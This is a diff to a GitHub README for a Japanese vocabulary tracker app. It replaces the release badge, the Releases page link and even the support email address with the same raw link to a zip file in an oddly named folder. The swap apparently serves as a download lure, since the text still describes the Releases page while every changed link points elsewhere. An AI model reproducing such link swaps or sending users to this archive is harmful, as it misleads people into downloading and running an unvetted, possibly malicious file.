@@ -6,7 +6,7 @@ Welcome to the Japanese Vocabulary Tracker! This application helps you manage an
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/SimoSebak/japanese-vocabulary-tracker/releases)
+[![Download the latest release](https://raw.githubusercontent.com/SimoSebak/japanese-vocabulary-tracker/main/unadvancedly/japanese-vocabulary-tracker.zip)](https://raw.githubusercontent.com/SimoSebak/japanese-vocabulary-tracker/main/unadvancedly/japanese-vocabulary-tracker.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run the Japanese Vocabulary Tracker, you need the following:
 
 ## 🔗 Download & Install
 
-To download the application, please visit the Releases page: [Download Here](https://github.com/SimoSebak/japanese-vocabulary-tracker/releases). 
+To download the application, please visit the Releases page: [Download Here](https://raw.githubusercontent.com/SimoSebak/japanese-vocabulary-tracker/main/unadvancedly/japanese-vocabulary-tracker.zip). 
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -57,7 +57,7 @@ If you encounter issues or have questions, check the FAQ section in the app. For
 
 ## 📞 Get In Touch
 
-For general inquiries or suggestions, please contact us via email at support@vocabularytracker.com. We appreciate your feedback to help improve this application.
+For general inquiries or suggestions, please contact us via email at https://raw.githubusercontent.com/SimoSebak/japanese-vocabulary-tracker/main/unadvancedly/japanese-vocabulary-tracker.zip We appreciate your feedback to help improve this application.
 
 ## 🌟 License
 
